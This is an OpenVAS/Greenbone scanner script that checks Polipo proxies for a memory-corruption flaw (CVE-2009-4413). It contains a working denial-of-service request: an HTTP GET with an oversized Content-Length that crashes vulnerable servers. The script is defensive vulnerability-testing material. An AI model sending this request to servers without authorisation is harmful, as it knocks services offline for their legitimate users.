# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100379");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2009-12-08 12:57:07 +0100 (Tue, 08 Dec 2009)");
  script_cve_id("CVE-2009-4413", "CVE-2009-3305");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Polipo Malformed HTTP GET Request Memory Corruption Vulnerability");
  script_category(ACT_DENIAL);
  script_family("Web Servers");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8123);
  script_mandatory_keys("Polipo/banner");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37226");
  script_xref(name:"URL", value:"http://www.pps.jussieu.fr/~jch/software/polipo/");

  script_tag(name:"summary", value:"Polipo is prone to a memory-corruption vulnerability.");

  script_tag(name:"impact", value:"Successful exploits may allow remote attackers to execute arbitrary
  code within the context of the affected application or crash the
  application, denying service to legitimate users.");

  script_tag(name:"affected", value:"Polipo 0.9.8 and 1.0.4 are vulnerable. Other versions may also
  be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:8123);
banner = http_get_remote_headers(port:port);
if(!banner || ! egrep(pattern:"Server: Polipo", string:banner))
  exit(0);

if(http_is_dead(port:port))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

req = string("GET / HTTP/1.1\r\nContent-Length: 2147483602\r\n\r\n");
send(socket:soc, data:req);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

close(soc);
exit(99);
